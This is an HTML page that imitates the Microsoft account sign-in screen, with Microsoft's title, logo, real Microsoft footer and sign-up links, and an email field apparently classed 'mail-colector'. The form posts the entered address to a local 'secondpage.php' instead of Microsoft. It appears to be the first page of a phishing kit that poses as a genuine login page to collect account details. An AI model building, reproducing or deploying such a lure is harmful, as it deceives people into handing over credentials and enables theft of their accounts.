<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<title>Sign in to your Microsoft account</title>
		<link rel="icon" href="img/favicon.ico">
		<link rel="stylesheet" href="css/StyleMain.css">
		<!-- Bootstrap 4 -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
		<!-- MDB 5 -->
		<link
		  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.5.0/mdb.min.css"
		  rel="stylesheet"
		/>
	</head>
	<body> 
		<div class="bg-sucess row align-items-center justify-content-center vh-100 mt-4">

			<form class="card container p-4 tamaño-container" action="secondpage.php" method="post">

				  <div class="container mt-3">
				    <img class="float-left " src="img/card.svg" width="108" height="24" alt="imagen-microsoft" >
				  </div>
				 	<div class="card-body">

						<h4 class="card-title font-weight-normal text-black">Sign In</h4>

						<!-- DATOS EMAIL -->
						<div class="md-form mb-2">
							<label for="email" class="small">Email, phone, or Skype</label>
                            <input type="email" name="email" id="correo" class="form-control mail-colector" required>            
                        </div>

						   <p class="card-text mb-2">No account? <a href="https://signup.live.com/?wa=wsignin1.0&rpsnv=13&ct=1589150126&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&contextid=B6B4CFFE7B54C130&bk=1589150130&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=6f22839701c643616da0c2d4f395b28a">Create One!</a></p>
						   <p class="card-text mb-2"><a href="#">Sign-in options</a></p>		
		  			</div>
		  				<!-- BUTTON -->
		  			<div class="text-right mr-2 mb-3">
						<input type="submit" name="register" value="Next" class="btn btn-primary font-weight-italic text-capitalize px-4" style="font-size: 1rem;">
            		</div>
			</form>
		</div>
		<footer class="fixed-bottom p-2">
			<div class="float-right ">
				<a class="mx-2 text-white small" href="https://www.microsoft.com/es-es/servicesagreement/">Terms of use</a>
				<a class="mx-2 text-white small" href="https://privacy.microsoft.com/es-es/privacystatement">Privacy & cookies</a>
				<a class="mx-2 text-white small" href="#">...</a>
			</div>
		</footer>
		<!-- Js Bootstrap 5 -->
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
		<!-- Js MDB -->
		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.5.0/mdb.min.js"> </script>
	    <script type="text/javascript" src="js/script.js"></script>
	</body>	
</html>